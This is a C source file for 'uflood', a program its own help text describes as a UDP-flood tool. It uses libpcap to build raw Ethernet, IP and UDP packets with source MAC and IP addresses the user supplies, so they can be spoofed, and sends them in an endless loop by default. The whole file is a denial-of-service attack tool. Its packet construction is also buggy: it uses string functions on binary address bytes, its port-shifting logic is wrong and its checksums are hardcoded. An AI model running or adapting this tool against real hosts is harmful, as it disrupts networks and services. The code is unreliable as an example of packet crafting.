/*
	My UDP ( 60 bytes ):
	08 00 27 73 17 FE 0A 00 27 00 00
	03 08 00 45 00 00 2E 00 00 40 00
	40 11 49 08 C0 A8 38 01 C0 A8 38
	65 00 50 00 50 00 1A 0D 63 00 00
	00 00 00 00 00 00 00 00 00 00 00
	00 00 00 00 00
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <pcap.h>

#define UDP_PACKET_SIZE 60
#define DEVICE_NAME_MAX 100
#define MAC_ADDRESS_MAX 7
#define IP_ADDRESS_MAX 5
#define PORT_MAX 3

#define printerr( ... ) 																			\
	fprintf( stderr, "\auflood: " __VA_ARGS__ )

// Sets command-line arguments for program
char SetArgv(
	char **argv, // {argv} of {main} function
	char *dev, // Device
	char *src_mac, // Source MAC address
	char *dest_mac, // Destination MAC address
	char *src_addr, // Source address
	char *dest_addr, // Destination address
	unsigned short *src_port, // Source port
	unsigned short *dest_port, // Destination port
	unsigned long long *pack_num // Count of packages
);

// Help output
void ManPrint( void );

// Prata's func to get string
char *s_gets( char *st, const int n );

// translates hex-string to hex integer number ( modified for MAC address )
// $ Returns integer hex number
int s_ihex( char *st );

int main( int argc, char *argv[] ){
	if( argc < 2 ){
		printf( "Not enough arguments\n" );
		printf( "Please type:\n" );
		printf( "\tuflood --help" );
		printf( "for more information" );
		return -1;
	}

	// Help output
	if( strcmp( argv[ 1 ], "--help" ) == 0 ){
		ManPrint();
		return 0;
	}

	register int i;
	pcap_t *pc_handle; // Pcap handle
	pcap_if_t *ldevs; // List of devices
	pcap_if_t *ldv_tmp; // ldevs's iterator
	char pc_errbuf[ PCAP_ERRBUF_SIZE ]; // Error output
	u_char pc_pack[ UDP_PACKET_SIZE ]; // Packet
	char pc_device[ DEVICE_NAME_MAX ]; // Device
	char pc_src_mac[ MAC_ADDRESS_MAX ]; // Source MAC address
	char pc_dest_mac[ MAC_ADDRESS_MAX ]; // Destination MAC address
	char pc_src_addr[ IP_ADDRESS_MAX ]; // Source IP address
	char pc_dest_addr[ IP_ADDRESS_MAX ]; // Destination IP address
	unsigned short pc_src_port; // Source port
	unsigned short pc_dest_port; // Destination port
	unsigned long long pc_pack_num; // Packet number

	// List of devices
	if( strcmp( argv[ 1 ], "--devlist" ) == 0 ){
		if( pcap_findalldevs( &ldevs, pc_errbuf ) ){
			printerr( "Can't find any device: %s\n", pc_errbuf );
			return 1;
		}
		printf( "Existing devices:\n" );
		for( ldv_tmp = ldevs; ldv_tmp; ldv_tmp = ldv_tmp->next ){
			printf( "%s\n", ldv_tmp->name );
		}
		return 0;
	}

	SetArgv(
		argv,
		pc_device,
		pc_src_mac,
		pc_dest_mac,
		pc_src_addr,
		pc_dest_addr,
		&pc_src_port,
		&pc_dest_port,
		&pc_pack_num
	);

	printf( "Enter name of device:\n> " );
	s_gets( pc_device, DEVICE_NAME_MAX ); 

	printf( "Device: %s\n", pc_device );
	pc_handle = pcap_open_live( pc_device, BUFSIZ, 1, 0, pc_errbuf ); // 0 - time-out ( in ms )

	if( pc_handle == NULL ){
		printerr( "Couldn't open device %s: %s\n", pc_device, pc_errbuf );
		return 2;
	}

	if( pcap_datalink( pc_handle ) != DLT_EN10MB ){
		printerr( "Device %s doesn't provide Ethernet headers -not  supported\n", pc_device );
		return 3;
	}

	// Packet filling
	sprintf( pc_pack, "%s", pc_dest_mac ); // Destination MAC address
	strcat( pc_pack, pc_src_mac ); // Source MAC address
	pc_pack[ 12 ] = 0x8; // Protocol ( IP )
	pc_pack[ 13 ] = 0x00;
	pc_pack[ 14 ] = 0x45; // Version and internet header length
	pc_pack[ 15 ] = 0; // Differentiated services codepoint
	pc_pack[ 16 ] = 0; // Total length
	pc_pack[ 17 ] = 0x2E;
	pc_pack[ 18 ] = 0; // Identification
	pc_pack[ 19 ] = 0;
	pc_pack[ 20 ] = 0x40; // Fragment flags (first 3 bits) and fragment offset
	pc_pack[ 21 ] = 0;
	pc_pack[ 22 ] = 0x40; // Time to live
	pc_pack[ 23 ] = 0x11; // Protocol
	pc_pack[ 24 ] = 0xBE; // Checksum
	pc_pack[ 25 ] = 0x6E;
	strcat( pc_pack, pc_src_addr ); // Source address
	strcat( pc_pack, pc_dest_addr ); // Destination address

	// Source port
	pc_pack[ 34 ] = 0;
	for( i = 8; i < sizeof( short ) * 8; i++ ){
		pc_pack[ 34 ] |= pc_src_port << i;
	}
	pc_pack[ 35 ] = 0;
	for( i = 0; i < 8; i++ ){
		pc_pack[ 35 ] |= pc_src_port << i;
	}

	// Destination port
	pc_pack[ 36 ] = 0;
	for( i = 8; i < sizeof( short ) * 8; i++ ){
		pc_pack[ 36 ] |= pc_dest_port << i;
	}
	pc_pack[ 37 ] = 0;
	for( i = 0; i < 8; i++ ){
		pc_pack[ 37 ] |= pc_dest_port << i;
	}

	pc_pack[ 38 ] = 0; // Length
	pc_pack[ 39 ] = 0x1A;
	pc_pack[ 40 ] = 0x7C; // Checksum
	pc_pack[ 41 ] = 0xC9;

	// Number of bytes
	srand( ( unsigned int ) clock() );
	for( i = 42; i < UDP_PACKET_SIZE; i++ ){
		pc_pack[ i ] = i % 256;
	}

	// Packet sending
	if( pc_pack_num == 0 ){
		while( 1 ){
			pcap_sendpacket( pc_handle, pc_pack, UDP_PACKET_SIZE );
		}
	} else {
		while( pc_pack_num ){
			pcap_sendpacket( pc_handle, pc_pack, UDP_PACKET_SIZE );
			pc_pack_num -= 1;
		}
	}
	
	return 0;
}

// Sets command-line arguments for program
char SetArgv(
	char **argv, // {argv} of {main} function
	char *dev, // Device
	char *src_mac, // Source MAC address
	char *dest_mac, // Destination MAC address
	char *src_addr, // Source address
	char *dest_addr, // Destination address
	unsigned short *src_port, // Source port
	unsigned short *dest_port, // Destination port
	unsigned long long *pack_num // Count of packages
){
	if(
		argv == NULL ||
		*argv == NULL ||
		dev == NULL ||
		src_mac == NULL ||
		dest_mac == NULL ||
		src_addr == NULL ||
		dest_addr == NULL
	){
		printerr( "SetArgv: unexpected null pointer\n" );
		return 0;
	}
	unsigned char i, v;
	unsigned char n = 0;
	*src_port = 0;
	*dest_port = 0;
	*pack_num = 0;
	for( i = 1; argv[ i ]; i++ ){
		if( strcmp( argv[ i ], "-d" ) == 0 ){ // Device
			if( argv[ i + 1 ] ){
				strncpy( dev, argv[ i + 1 ], DEVICE_NAME_MAX - 1 );
				dev[ DEVICE_NAME_MAX - 1 ] = 0;
				i++;
			} else {
				printerr( "SetArgv: need argument for \'-d\'\n" );
				return 0;
			}
		} else if( strcmp( argv[ i ], "-sm" ) == 0 ){ // Source MAC address
			if( argv[ i + 1 ] ){
				memset( src_mac, 0, MAC_ADDRESS_MAX );
				for( v = 0; v < MAC_ADDRESS_MAX - 1; v += 2 ){
					if( argv[ i + 1 ][ v ] == ':' ){ // Next hex number
						n += 1;
						if( n == MAC_ADDRESS_MAX ){
							printerr( "SetArgv: wrong MAC address\n" );
							return 0;
						}
						v += 1;
					}
					// [n] has been introduced for checking correctness of MAC address
					src_mac[ n ] += s_ihex( &( argv[ i + 1 ][ v ] ) );
				}
				if( n != MAC_ADDRESS_MAX - 1 ){
					printerr( "SetArgv: wrong MAC address ( right form: xx:xx:xx:xx:xx:xx )\n" );
					return 0;
				}
				n = 0;
				i++;
			} else {
				printerr( "SetArgv: need argument for \'-sm\'\n" );
				return 0;
			}
		} else if( strcmp( argv[ i ], "-dm" ) == 0 ){ // Destination MAC address
			if( argv[ i + 1 ] ){
				memset( dest_mac, 0, MAC_ADDRESS_MAX );
				for( v = 0; v < MAC_ADDRESS_MAX - 1; v += 2 ){
					if( argv[ i + 1 ][ v ] == ':' ){ // Next hex number
						n += 1;
						if( n == MAC_ADDRESS_MAX ){
							printerr( "SetArgv: wrong MAC address\n" );
							return 0;
						}
						v += 1;
					}
					// [n] has been introduced for checking correctness of MAC address
					dest_mac[ n ] += s_ihex( &( argv[ i + 1 ][ v ] ) );
				}
				if( n != MAC_ADDRESS_MAX - 1 ){
					printerr( "SetArgv: wrong MAC address ( right form: xx:xx:xx:xx:xx:xx )\n" );
					return 0;
				}
				n = 0;
				i++;
			} else {
				printerr( "SetArgv: need argument for \'-dm\'\n" );
				return 0;
			}
		} else if( strcmp( argv[ i ], "-sa" ) == 0 ){ // Source address
			if( argv[ i + 1 ] ){
				for( v = 0; argv[ i + 1 ][ v ]; v++ ){
					if( argv[ i + 1 ][ v ] == '.' ){
						n += 1;
						if( n == IP_ADDRESS_MAX ){
							printerr( "SetArgv: wrong IP address\n" );
							return 0;
						}
						continue;
					}
					src_addr[ n ] += argv[ i + 1 ][ v ] - '0';
					if( argv[ i + 1 ][ v + 1 ] != '.' && argv[ i + 1 ][ v + 1 ] != 0 ){
						src_addr[ n ] *= 10;
					}
				}
				if( n != IP_ADDRESS_MAX - 1 ){
					printerr( "SetArgv: wrong IP address ( right form: ddd.ddd.ddd.ddd )\n" );
					return 0;
				}
				n = 0;
				i++;
			} else {
				printerr( "SetArgv: need argument for \'-sa\'\n" );
				return 0;
			}
		} else if( strcmp( argv[ i ], "-da" ) == 0 ){
			if( argv[ i + 1 ] ){
				for( v = 0; argv[ i + 1 ][ v ]; v++ ){
					if( argv[ i + 1 ][ v ] == '.' ){
						n += 1;
						if( n == IP_ADDRESS_MAX ){
							printerr( "SetArgv: wrong IP address\n" );
							return 0;
						}
						continue;
					}
					dest_addr[ n ] += argv[ i + 1 ][ v ] - '0';
					if( argv[ i + 1 ][ v + 1 ] != '.' && argv[ i + 1 ][ v + 1 ] != 0 ){
						dest_addr[ n ] *= 10;
					}
				}
				if( n != IP_ADDRESS_MAX - 1 ){
					printerr( "SetArgv: wrong IP address ( right form: ddd.ddd.ddd.ddd )\n" );
					return 0;
				}
				n = 0;
				i++;
			} else {
				printerr( "SetArgv: need argument for \'-da\'\n" );
				return 0;
			}
		} else if( strcmp( argv[ i ], "-sp" ) == 0 ){
			if( argv[ i + 1 ] ){
				// Decimal port
				for( v = 0; argv[ i + 1 ][ v ]; v++ ){
					*src_port += argv[ i + 1 ][ v ] - '0';
					if( argv[ i + 1 ][ v + 1 ] != 0 ){
						*src_port *= 10;
					}
				}
				i++;
			} else {
				printerr( "SetArgv: need argument for \'-sp\'\n" );
				return 0;
			}
		} else if( strcmp( argv[ i ], "-dp" ) == 0 ){
			if( argv[ i + 1 ] ){
				// Decimal port
				for( v = 0; argv[ i + 1 ][ v ]; v++ ){
					*dest_port += argv[ i + 1 ][ v ] - '0';
					if( argv[ i + 1 ][ v + 1 ] != 0 ){
						*dest_port *= 10;
					}
				}
				i++;
			} else {
				printerr( "SetArgv: need argument for \'-dp\'\n" );
				return 0;
			}
		} else if( strcmp( argv[ i ], "-c" ) == 0 ){
			if( argv[ i + 1 ] ){
				for( v = 0; argv[ i + 1 ][ v ]; v++ ){
					*pack_num += argv[ i + 1 ][ v ] - '0';
					if( argv[ i + 1 ][ v + 1 ] != 0 ){
						*pack_num *= 10;
					}
				}
				i++;
			} else {
				printerr( "SetArgv: need argument for \'-c\'\n" );
				return 0;
			}
		}
	}
	return 1;
}

// Help output
void ManPrint( void ){
	printf( "uflood - UDP-flood program\n");
	printf( "Syntax of command:\n" );
	printf( "\tuflood [ option ] [ value ]\n\n" );
	printf( "List of options:\n" );
	printf( "\t--devlist - show device list\n" );
	printf( "\t-d [ DEVICE ] - device to listen ( example: uflood -d wlan0 )\n" );
	printf( "\t-sm [ MAC ADDRESS ] - add source MAC address ( example: uflood -d eth0 -sm 11:22:33:44:55:66 )\n" );
	printf( "\t-dm [ MAC ADDRESS ] - add destination MAC address ( example: uflood -d eth0 -dm 10:20:30:40:50:60\n" );
	printf( "\t-sa [ ADDRESS ] - add source ip address ( example: uflood -d eth0 192.168.64.1 )\n" );
	printf( "\t-da [ ADDRESS ] - add destination ip address ( example: uflood -d eth0 192.168.64.109 )\n" );
	printf( "\t-sp [ PORT ] - add source port\n" );
	printf( "\t-dp [ PORT ] - add destination port\n" );
	printf( "\t-c [ NUMBER ] - change packet count ( default: infinity )\n" );
}

// Prata's func to get string
char *s_gets( char *st, const int n ){
	char *ret_val;
	char *find;
	ret_val = fgets( st, n, stdin );
	if( ret_val ){
		find = strchr( st, '\n' );
		if( find )
			*find = '\0';
		else
			while( getchar() != '\n' )
				continue;
	}
	return ret_val;
}

// translates hex-string to hex integer number ( modified for MAC address )
// $ Returns integer hex number
int s_ihex( char *st ){
	unsigned char i;
	int res = 0;
	#define S_IHEX_CONDITION( C, HEX )																			\
		if( st[ i ] == C || st[ i ] == C + 32 )																	\
			res |= HEX
	for( i = 0; st[ i ] != 0 && st[ i ] != ':'; i++ ){
		if( st[ i ] >= '0' && st[ i ] <= '9' ){
			res |= st[ i ] - '0';
		} else {
			S_IHEX_CONDITION( 'A', 0xA );
			S_IHEX_CONDITION( 'B', 0xB );
			S_IHEX_CONDITION( 'C', 0xC );
			S_IHEX_CONDITION( 'D', 0xD );
			S_IHEX_CONDITION( 'E', 0xE );
			S_IHEX_CONDITION( 'F', 0xF );
		}
		if( st[ i + 1 ] != 0 && st[ i + 1 ] != ':' ){
			res <<= 4;
		}
	}
	return res;
	#undef S_IHEX_CONDITION
}